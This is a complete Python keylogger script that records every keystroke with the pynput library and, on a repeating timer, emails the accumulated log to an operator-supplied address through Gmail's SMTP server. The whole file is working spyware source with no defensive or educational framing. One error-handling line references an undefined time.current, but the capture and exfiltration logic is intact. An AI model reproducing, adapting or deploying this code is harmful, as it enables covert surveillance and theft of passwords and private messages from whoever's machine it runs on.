#!/usr/bin/env python
import pynput.keyboard as pynput
import threading, smtplib


def main():
    keylogger = Keylogger()
    keylogger.start()

class Keylogger:
    def __init__(self):
        self.log = 'Keylogger Started'
        try:
            self.interval = int(input('Desired email interval ' + \
            '(in minutes): '))*60
        except ValueError:
            print('Invalid time input. Exiting...')
            exit()
        self.email = input('Email to send logs to: ')
        self.password = input('Gmail password key: ')

    def start(self):
        keyboard_listener = pynput.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def append_log(self, str):
        self.log = self.log + str

    def process_key_press(self, key):
        try:
            self.append_log(str(key.char))
            return
        except AttributeError:
            if str(key) == "Key.space":
                self.append_log(' ')
                return 
            key = str(key).replace('Key.', '')
            self.append_log(f' ({key}) ')
    
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("SMTP.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        try:
            self.send_mail(self.email, self.password, f'\n\n{self.log}')
            self.log = ''
        except smtplib.SMTPAuthenticationError:
            print('Invalid email/password combo. Exiting...')
            exit()
        except:
            print(f'Failed to send email at {time.current}. Will continue ' + \
            f'to append and send in {self.interval} minutes.')
        timer = threading.Timer(self.interval, self.report)
        timer.start()


if __name__ == '__main__':
    main()